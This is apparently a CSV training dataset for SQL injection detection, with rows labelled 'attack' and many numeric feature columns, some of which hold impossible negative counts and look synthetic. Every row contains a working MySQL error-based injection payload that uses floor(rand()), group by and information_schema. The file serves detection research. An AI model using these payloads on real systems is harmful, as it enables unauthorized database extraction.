id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000361,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000024,7.049046677057539,285.92138671875,106.9318618774414,42.013214111328125,111.68184661865234,-21.04703712463379,89.67398834228516,38.33641815185547,1.4355385303497314,0.35198017954826355,0.10587730258703232,0.35528892278671265,0.14480747282505035,4.102825164794922,1.6235071420669556,1.259801983833313,-0.15721428394317627,0.19099734723567963,0.4572124481201172,-0.362533837556839,12.82343864440918,10.079838752746582,2.1098978519439697,0.4760012626647949,1.7825103998184204,0.0879611149430275,-0.21810027956962585,-0.24004532396793365,0.29147663712501526,1.7867144346237183,0.49214500188827515,0.33141621947288513,1.1731935739517212,-0.24385294318199158,0.37875550985336304,1.6064270734786987,4.8011908531188965,0.7207607626914978,3.3490169048309326,1.3121490478515625,-0.4497324526309967,1.0815736055374146,-0.5071765780448914,0.09645838290452957,-0.11949806660413742,0.03871452063322067,-1.4944076538085938,0.17354154586791992,0.028407657518982887,0.16663047671318054,0.11761175841093063,0.8850983381271362,0.6289335489273071,-0.23799249529838562,0.29680630564689636,0.1866428107023239,0.12483412772417068,0.01948331855237484,-0.48810166120529175,-0.2456350028514862,0.15685969591140747,-0.13743677735328674,-0.6384429335594177,-1.0680001974105835,0.041375692933797836,-0.39239686727523804,0.5176802277565002,-1.1248998641967773,-0.3335970342159271,0.9250362515449524,-0.6152428984642029,-0.031274303793907166,0.06251947581768036,-0.4928663969039917,-0.2529972195625305,-0.2064134180545807,1.6424002647399902,0.5277366042137146,-0.2860066294670105,0.04029878228902817,0.5920840501785278,11.083732604980469,1.4412364959716797,0.49745774269104004,-0.03208961337804794,0.880858302116394,-0.717540979385376,0.9615951180458069,0.3914686143398285
GAN_000362,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.6305837152103395,283.6947937011719,106.90772247314453,40.49005889892578,107.44451141357422,-8.394898414611816,91.08024597167969,37.046443939208984,1.403653860092163,0.36387598514556885,0.11891920864582062,0.3721129596233368,0.13259314000606537,3.948452949523926,1.4053668975830078,0.7289023399353027,0.3028463125228882,0.1967877596616745,0.0352671816945076,-0.10803598165512085,11.513038635253906,11.581841468811035,2.898003101348877,0.29790493845939636,1.8530892133712769,0.1994333118200302,-0.44953659176826477,-0.02928468957543373,0.14888834953308105,1.213698387145996,0.4171295464038849,-0.0126149021089077,1.2876077890396118,-0.029395274817943573,0.304504930973053,1.7150177955627441,6.517448425292969,0.8373895883560181,3.0357131958007812,0.8868579268455505,-0.11863452941179276,1.091295838356018,-0.39322516322135925,0.09908569604158401,-0.1505451500415802,0.1997305154800415,-0.7289760112762451,0.265869140625,0.19064263999462128,0.17794902622699738,0.14841580390930176,0.6495145559310913,0.26520586013793945,-0.2753928005695343,0.48456355929374695,0.15231874585151672,0.17220135033130646,-0.08409908413887024,-0.2530915141105652,-0.0861770436167717,-0.15754801034927368,-0.0686960443854332,-0.21488754451274872,-0.959368109703064,0.0017589310882613063,-0.4769021272659302,0.6273367404937744,-0.7499549388885498,-0.06877033412456512,0.6258293986320496,-0.3419214189052582,-0.09757040441036224,0.06898698210716248,-0.47456449270248413,0.05213755741715431,0.12444386631250381,1.3145840167999268,0.41235098242759705,-0.15351970493793488,-0.005631260573863983,0.5181863307952881,11.021730422973633,1.136085033416748,0.40070587396621704,0.002113969763740897,0.8155278563499451,-0.572693943977356,0.8635984659194946,0.28081661462783813
GAN_000363,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.102515553359625,292.90924072265625,107.25733184814453,40.86837387084961,113.3101577758789,-10.769866943359375,84.34929656982422,44.57129669189453,1.8152769804000854,0.34458479285240173,0.10403577983379364,0.357145220041275,0.14612990617752075,4.001607894897461,1.0449495315551758,1.049070954322815,0.3339219093322754,0.3332464098930359,0.16806286573410034,-0.5592861771583557,12.459589958190918,12.978437423706055,1.2749804258346558,0.37749654054641724,1.5789463520050049,0.33816707134246826,-0.22623863816261292,5.5279106163652614e-05,0.09501534700393677,1.1887438297271729,0.7915738224983215,-0.07680737972259521,0.8193871378898621,-0.2295762598514557,0.3387672007083893,1.590858817100525,7.523292541503906,0.558857262134552,3.7400705814361572,1.2012016773223877,-0.2782703936100006,1.066758394241333,-0.39285001158714294,0.10593206435441971,-0.15903140604496002,0.03682531416416168,-1.475955843925476,0.5297664999961853,0.008634650148451328,0.3537798523902893,0.1208135113120079,0.8866016268730164,0.540457010269165,-0.3195662200450897,0.45003142952919006,0.09803484380245209,0.26698410511016846,0.15560278296470642,-0.6922728419303894,-0.08382517099380493,0.38066819310188293,0.08514892309904099,-0.3897041976451874,-1.237395167350769,-0.0287790410220623,-0.6203011870384216,0.5027679800987244,-1.2199008464813232,-0.6060372591018677,0.788625955581665,-0.27308815717697144,0.0623859167098999,-0.05949323624372482,-0.43425464630126953,-0.2589823007583618,-0.030374012887477875,1.3590962886810303,0.47621598839759827,-0.6096610426902771,0.06000411510467529,0.38288694620132446,9.708141326904297,1.3518145084381104,0.4778570532798767,-0.04573001712560654,0.7622130513191223,-0.29113996028900146,1.1923662424087524,0.5914411544799805
GAN_000364,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.28968684263753,295.76104736328125,104.213623046875,39.36655807495117,114.09870910644531,-7.193661689758301,87.06993103027344,42.606685638427734,1.7083698511123657,0.33762356638908386,0.11743219941854477,0.3597871661186218,0.14271974563598633,4.014291763305664,1.0472970008850098,0.7788905501365662,0.05332961678504944,0.35716310143470764,-0.0018779709935188293,-0.47055745124816895,11.149821281433105,11.594435691833496,1.5628472566604614,0.5050798058509827,1.748297929763794,0.25243714451789856,-0.28123924136161804,-0.024204079061746597,0.10803237557411194,1.162534236907959,0.6664701104164124,-0.009586270898580551,1.1359115839004517,-0.05619395151734352,0.3080693483352661,1.5352922677993774,6.761908531188965,0.7453482151031494,3.377220630645752,0.9571376442909241,-0.20370201766490936,0.9271718263626099,-0.3332797586917877,0.09628453105688095,-0.22869907319545746,-0.011744961142539978,-1.050087809562683,0.4556407928466797,0.1377745270729065,0.19841673970222473,0.1665506809949875,0.7858688235282898,0.44661304354667664,-0.41013815999031067,0.42275097966194153,0.0725436806678772,0.24233055114746094,-0.02045973762869835,-0.41510313749313354,-0.15288081765174866,0.1910344362258911,-0.005836866796016693,-0.2386934459209442,-0.8522562384605408,0.007856209762394428,-0.6103924512863159,0.5799835324287415,-0.7859482765197754,-0.36754000186920166,0.6105386018753052,-0.376780241727829,0.23882025480270386,0.12597106397151947,-0.39954686164855957,-0.3450877368450165,-0.22282680869102478,1.4087265729904175,0.4340781569480896,-0.5102074146270752,0.0028423445764929056,0.5324317812919617,10.41991901397705,1.1697016954421997,0.42452147603034973,-0.020587677136063576,0.8760356903076172,-0.5221768021583557,0.8933755159378052,0.29880088567733765
GAN_000365,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.777447715292073,272.03076171875,101.3839111328125,40.52470397949219,109.6952133178711,-11.720569610595703,85.02059173583984,39.27143478393555,1.6884862184524536,0.35199639201164246,0.11240440607070923,0.3813726007938385,0.13938026130199432,3.9702489376068115,0.7368955016136169,0.9467263221740723,0.2826414704322815,0.3809794485569,0.11826254427433014,-0.42725327610969543,12.425941467285156,12.424476623535156,1.4952625036239624,0.12225047498941422,1.6513360738754272,0.19075684249401093,-0.414320170879364,-0.20179642736911774,0.11659016460180283,0.8431286811828613,0.5547109246253967,-0.08737170696258545,1.0117547512054443,-0.3584141731262207,0.3729052245616913,1.6157550811767578,6.091389179229736,0.8605862855911255,3.4528276920318604,1.2741187810897827,-0.386689692735672,1.0015919208526611,-0.6528468728065491,0.1269831508398056,-0.19102896749973297,0.1231626346707344,-1.0338860750198364,0.28019946813583374,0.12993070483207703,0.20628716051578522,-0.021274780854582787,0.8097935318946838,0.5005038380622864,-0.2848163843154907,0.45178472995758057,0.15292252600193024,0.1776137799024582,0.25568339228630066,-0.7446964979171753,-0.13388517498970032,0.09270141273736954,-0.1259315311908722,-0.22765658795833588,-0.9443219304084778,-0.028400477021932602,-0.5827323198318481,0.6283049583435059,-1.4508600234985352,-0.39658284187316895,0.5613165497779846,-0.48049136996269226,0.14076416194438934,0.07897540926933289,-0.7374613285064697,-0.02720913290977478,0.2915377616882324,1.4760844707489014,0.4794270992279053,-0.43673625588417053,0.0355590283870697,0.4197768270969391,11.392711639404297,1.416164755821228,0.38010066747665405,0.021964484825730324,0.6965869069099426,-0.39843618869781494,1.141036033630371,0.3713192939758301
GAN_000366,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.797170745852911,281.0256042480469,103.0127182006836,40.826168060302734,108.07366180419922,-10.95775032043457,95.02326965332031,37.28605270385742,1.2165172100067139,0.34784355759620667,0.11193054169416428,0.37786009907722473,0.13508538901805878,4.000524997711182,1.3774347305297852,0.8043546676635742,0.3384926915168762,0.25565165281295776,0.2528022825717926,-0.14443394541740417,12.201364517211914,11.493681907653809,2.7026283740997314,0.301158607006073,1.8526798486709595,0.18769605457782745,-0.3852602541446686,-0.0550457127392292,0.15310578048229218,1.1433390378952026,0.3812768757343292,-0.12371601909399033,1.3151652812957764,-0.05534014478325844,0.38583946228027344,1.635454773902893,6.376808166503906,0.8312454223632812,3.132561683654785,1.0731123685836792,-0.18549327552318573,1.0746713876724243,-0.4533577859401703,0.08579496294260025,-0.10639731585979462,0.10438212752342224,-0.8711841702461243,0.21214063465595245,0.16009639203548431,0.18172624707221985,0.18827132880687714,0.7381376028060913,0.47968482971191406,-0.2810293138027191,0.5677342414855957,0.13440608978271484,0.1936596930027008,-0.09407024085521698,-0.5237336158752441,-0.1649707406759262,-0.05670800060033798,-0.13137680292129517,-0.11263904720544815,-0.8668757677078247,0.014551816508173943,-0.5469405055046082,0.7290987372398376,-0.8731151819229126,-0.06845448166131973,0.5808088779449463,-0.49193763732910156,0.07949205487966537,0.2782179117202759,-0.4164484739303589,-0.2439851462841034,0.0919325202703476,1.6667819023132324,0.3564254343509674,-0.07409319281578064,0.0035259576980024576,0.5242921113967896,11.450258255004883,1.2105112075805664,0.44374316930770874,0.02928522415459156,0.7424877285957336,-0.3859201669692993,1.1543159484863281,0.4942302703857422
GAN_000367,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.272101352147154,304.2682189941406,108.7034912109375,39.55607986450195,113.17960357666016,-11.736274719238281,94.38248443603516,40.97904968261719,1.5688917636871338,0.3640100061893463,0.11632535606622696,0.3717770278453827,0.1294826716184616,3.9581634998321533,1.2403528690338135,0.9261870980262756,0.25003546476364136,0.2798255681991577,-0.01666548103094101,-0.07359394431114197,11.524524688720703,12.579957962036133,2.761756181716919,0.03788486123085022,1.7875747680664062,0.20843903720378876,-0.5913980007171631,-0.015257482416927814,0.1494186669588089,1.282424807548523,0.4689405560493469,-0.027584297582507133,0.9574641585350037,-0.007756272330880165,0.336839497089386,1.497018814086914,6.091268062591553,0.8321829438209534,3.5889062881469727,1.2226769924163818,-0.17526356875896454,1.046877145767212,-0.4244650900363922,0.11564120650291443,-0.20854395627975464,0.22267024219036102,-1.058837652206421,0.31136661767959595,0.08809977024793625,0.29966846108436584,0.14298304915428162,0.8098598122596741,0.1898169219493866,-0.29755091667175293,0.5273857712745667,0.1697012186050415,0.21564793586730957,-0.11939112842082977,-0.3098861575126648,-0.4317290782928467,-0.009484607726335526,-0.013904668390750885,-0.5302352905273438,-1.2577840089797974,-0.00999803002923727,-0.739255428314209,0.6445307731628418,-1.2732492685317993,-0.09368760883808136,0.849257230758667,-0.6956027150154114,0.018232839182019234,0.24936214089393616,-0.7882487773895264,0.03361117094755173,-0.0003260001540184021,1.3347043991088867,0.3023791015148163,-0.3401370942592621,0.020453371107578278,0.5386962890625,10.713760375976562,1.1548209190368652,0.4135326147079468,0.00792156532406807,0.8455406427383423,-0.522553026676178,1.1646307706832886,0.4333307445049286
GAN_000368,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.764384880431993,291.1656188964844,96.25617218017578,41.645565032958984,111.8924789428711,-2.51544451713562,79.18705749511719,38.75582504272461,1.3641530275344849,0.33359646797180176,0.13000647723674774,0.3713207244873047,0.13448746502399445,3.97198224067688,1.3275842666625977,0.6014444231987,0.36167240142822266,0.260463148355484,0.20975381135940552,-0.16170772910118103,10.662508010864258,11.388949394226074,2.436866521835327,0.2235904484987259,1.9120792150497437,0.2548525333404541,-0.20425289869308472,-0.05073610320687294,0.1037178486585617,1.0780327320098877,0.4464627802371979,-0.11099687963724136,1.5114918947219849,-0.17190168797969818,0.36821240186691284,1.801409363746643,6.844320297241211,0.7578493356704712,3.3361918926239014,0.9534281492233276,-0.03022090531885624,0.8756009340286255,-0.35236671566963196,0.03557424992322922,0.11955706775188446,0.01743496023118496,-0.8231898546218872,0.3264623284339905,0.21438974142074585,0.30315351486206055,0.21746113896369934,0.6874701380729675,0.3125377297401428,-0.06285829842090607,0.4344920814037323,0.09691786020994186,0.17421434819698334,-0.044924478977918625,-0.18138259649276733,-0.36351293325424194,-0.12649866938591003,0.22215181589126587,-0.07680021226406097,-0.8343849182128906,-0.004326612688601017,-0.41622161865234375,0.6192759871482849,-0.6086398363113403,-0.35816237330436707,0.2721150517463684,-0.3804328143596649,0.13637110590934753,0.09628243744373322,-0.570065975189209,0.07777318358421326,0.12554146349430084,1.2692185640335083,0.39587628841400146,-0.2538701891899109,0.05503988265991211,0.48281967639923096,10.411391258239746,1.0635581016540527,0.36653053760528564,0.0109300147742033,0.7250620722770691,-0.1860561966896057,0.6651411652565002,0.31906700134277344
GAN_000369,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.575656920874643,284.4941711425781,103.08036041259766,40.97712326049805,103.46712493896484,-16.31145668029785,102.70146179199219,38.2634162902832,1.481304407119751,0.3543824255466461,0.10422788560390472,0.36771246790885925,0.134317085146904,4.0662922859191895,0.8939730525016785,1.4468427896499634,0.14293208718299866,0.2540448009967804,0.2015499770641327,-0.3302115499973297,12.851268768310547,12.604520797729492,2.306917190551758,0.13037310540676117,1.628231167793274,0.28566163778305054,-0.299843430519104,-0.13130305707454681,0.23874764144420624,1.3921096324920654,0.45531922578811646,-0.03545341268181801,1.1128069162368774,-0.3229568898677826,0.2797669470310211,1.6165645122528076,6.288684368133545,0.9037482738494873,3.4880285263061523,1.410187005996704,-0.223886176943779,1.261256217956543,-0.5805923342704773,0.0978069081902504,-0.05186647176742554,0.025409119203686714,-1.1744060516357422,0.23901553452014923,-0.00712359556928277,0.2369767725467682,-0.09649217873811722,0.8378136157989502,0.33690154552459717,-0.42883431911468506,0.5199434757232666,0.19377866387367249,0.16921906173229218,0.02496519312262535,-0.4687454104423523,-0.2258177548646927,0.022433079779148102,-0.2781521677970886,-0.4735334813594818,-0.997766375541687,-0.007006027735769749,-0.27834683656692505,0.6709542274475098,-1.2677712440490723,-0.2831414043903351,0.8067572712898254,-0.6067150831222534,-0.15291425585746765,0.027508869767189026,-0.5491917133331299,-0.3781980574131012,-0.1968303620815277,1.58066725730896,0.41169092059135437,-0.42215394973754883,0.037769660353660583,0.35479405522346497,11.221854209899902,1.443543553352356,0.46921202540397644,0.05761536583304405,0.8386123180389404,-0.39514920115470886,1.0591007471084595,0.5871389508247375
GAN_000370,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.6719595013857464,285.95501708984375,95.78238677978516,43.4270133972168,113.2197265625,-14.532264709472656,88.42383575439453,40.6287841796875,1.5528063774108887,0.3246900737285614,0.10737990587949753,0.3631027042865753,0.13769401609897614,4.06064510345459,1.4456520080566406,0.8566720485687256,0.09571903944015503,0.2866303026676178,0.5119394063949585,-0.533327579498291,11.975129127502441,10.834665298461914,1.8276326656341553,0.5048547983169556,1.6350542306900024,0.14289046823978424,-0.18745282292366028,-0.07334344834089279,0.23962198197841644,1.4713077545166016,0.5245181322097778,0.010957617312669754,1.512886881828308,-0.23086391389369965,0.33696478605270386,1.5504775047302246,6.058177947998047,0.9311464428901672,3.638566493988037,1.4971305131912231,-0.41696831583976746,1.1207822561264038,-0.47343114018440247,0.049235403537750244,-0.05680953711271286,0.3169521391391754,-1.4114028215408325,0.26413723826408386,0.05784329026937485,0.18117612600326538,0.05317135900259018,0.7803385853767395,0.6361088752746582,-0.6062918901443481,0.29614269733428955,0.09036577492952347,0.21353362500667572,-0.12994688749313354,-0.4922051429748535,-0.16556048393249512,0.013574011623859406,0.10930290073156357,-0.1352636218070984,-1.0919270515441895,-0.012941819615662098,-0.6738295555114746,0.5303967595100403,-0.910975456237793,-0.6969592571258545,0.6688473224639893,-0.4937111437320709,0.42394667863845825,0.06537109613418579,-0.5841039419174194,-0.11903327703475952,-0.028325416147708893,1.671354055404663,0.4815392792224884,-0.29010650515556335,0.0358080193400383,0.656234622001648,10.53567123413086,1.4082685708999634,0.4522959589958191,-0.041237831115722656,0.9109077453613281,-0.4798142910003662,1.1355105638504028,0.7598869800567627
GAN_000371,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.026268107998492,290.3553466796875,97.69499206542969,40.99429702758789,108.03543853759766,-10.048639297485352,80.45199584960938,37.483768463134766,1.3738677501678467,0.33940061926841736,0.1298045665025711,0.37149494886398315,0.1467759907245636,4.022709846496582,1.2771577835083008,0.9857420921325684,0.16345298290252686,0.16832274198532104,0.47035667300224304,-0.30975019931793213,10.924765586853027,9.91683292388916,2.5906474590301514,0.31231215596199036,1.7315202951431274,0.14293496310710907,-0.08042769134044647,-0.1495886594057083,0.11554858088493347,1.1231157779693604,0.38386231660842896,0.12365350872278214,1.48599374294281,-0.40615537762641907,0.2857281267642975,1.843005657196045,6.684391021728516,0.6441783308982849,3.1940884590148926,1.0077112913131714,-0.19193951785564423,0.9492360949516296,-0.46984055638313293,0.048364389687776566,-0.08247935771942139,0.02862739749252796,-0.9040592908859253,0.3749830424785614,0.08727189153432846,0.2890051603317261,0.19130322337150574,0.6673992276191711,0.46148863434791565,-0.012320734560489655,0.46194955706596375,0.10251886397600174,0.1352693736553192,0.11725050210952759,-0.3544403314590454,-0.16022033989429474,0.0922434851527214,0.00897170603275299,-0.3572078347206116,-0.7826977968215942,0.019101344048976898,-0.35894232988357544,0.5828344225883484,-0.7105560302734375,-0.30031588673591614,0.3601984679698944,-0.3499917685985565,-0.07452189922332764,-0.22735555469989777,-0.39049720764160156,-0.2813127338886261,-0.06479790806770325,1.3867249488830566,0.5327234864234924,-0.34345319867134094,0.055779680609703064,0.38992080092430115,10.174120903015137,1.2756937742233276,0.36007601022720337,-0.004931455943733454,0.7619462013244629,-0.40043556690216064,0.5927945971488953,0.3436082899570465
GAN_000372,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.01055752475855,284.0927429199219,107.71037292480469,37.51918411254883,109.95137023925781,-13.168319702148438,92.98860168457031,36.58404541015625,1.2119503021240234,0.36989927291870117,0.11352808028459549,0.3750295341014862,0.12967167794704437,3.9940125942230225,1.3441115617752075,1.097390055656433,0.03159010410308838,0.2662588953971863,0.1371043473482132,0.024288618937134743,12.253866195678711,12.424267768859863,2.5942142009735107,0.17149612307548523,1.8609068393707275,0.17215150594711304,-0.3601074516773224,-0.0534462071955204,0.1411585807800293,1.3503952026367188,0.42395463585853577,0.06252887845039368,1.2394590377807617,-0.15061353147029877,0.3356934189796448,1.5221933126449585,5.673725605010986,0.7939914464950562,3.2928924560546875,1.0803183317184448,-0.2141805738210678,0.9682079553604126,-0.46968719363212585,0.06550570577383041,-0.1602054238319397,-0.04052653908729553,-1.0097862482070923,0.26668107509613037,0.1794554591178894,0.28705522418022156,0.19528023898601532,0.7422085404396057,0.2559272050857544,-0.27015596628189087,0.5241141319274902,0.2382560670375824,0.19182318449020386,-0.024880949407815933,-0.4955805540084839,-0.37566569447517395,-0.21041026711463928,-0.2073512077331543,-0.15490689873695374,-0.8430851697921753,-0.01002244371920824,-0.5210456848144531,0.7447889447212219,-0.8824853897094727,0.03871244937181473,0.7802492380142212,-0.6521399021148682,0.08170964568853378,0.45545950531959534,-0.5305247902870178,-0.11845222115516663,0.11015994101762772,1.3598415851593018,0.3758810758590698,-0.25075575709342957,-0.021584145724773407,0.5317956209182739,12.043848037719727,1.2266020774841309,0.4316653907299042,0.015443874523043633,0.8165423274040222,-0.455604612827301,0.9888346195220947,0.19543325901031494
GAN_000373,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.613892716695395,287.048583984375,103.13713073730469,42.7642822265625,110.97756958007812,-14.581676483154297,95.17707824707031,41.446834564208984,1.430915117263794,0.35139724612236023,0.10084935277700424,0.36156976222991943,0.13577179610729218,4.053857803344727,1.3819760084152222,0.9711383581161499,0.09331628680229187,0.2818313241004944,0.2494664192199707,-0.280709445476532,13.045554161071777,11.76809024810791,2.0544676780700684,0.36017435789108276,1.8720744848251343,0.2028474360704422,-0.39485740661621094,-0.09722971171140671,0.23311732709407806,1.4072579145431519,0.5244026184082031,0.13055765628814697,1.2368783950805664,-0.12903210520744324,0.3655705153942108,1.6088300943374634,5.484454154968262,1.0439099073410034,3.812612771987915,1.261940360069275,-0.24786745011806488,0.9814479351043701,-0.4861811101436615,0.08224993199110031,-0.04261920973658562,0.08858168870210648,-1.1768840551376343,0.10832294076681137,0.09651007503271103,0.14241844415664673,0.10918598622083664,0.8881595134735107,0.6246313452720642,-0.5120835900306702,0.41475456953048706,0.10539747029542923,0.1617998480796814,-0.018219012767076492,-0.5836310982704163,-0.15706990659236908,0.08180224150419235,-0.18103739619255066,-0.5323841571807861,-1.087429165840149,0.020142383873462677,-0.5728298425674438,0.5972105264663696,-1.0546002388000488,-0.2876374423503876,0.8987712860107422,-0.6048296093940735,0.12393010407686234,0.35829323530197144,-0.5826056003570557,-0.23893257975578308,0.13107654452323914,1.5635980367660522,0.35583630204200745,-0.3950696885585785,0.02861832082271576,0.5566590428352356,11.588970184326172,1.2522684335708618,0.4651317298412323,-0.0018030185019597411,0.9132363200187683,-0.4704832136631012,1.0048086643218994,0.5285764932632446
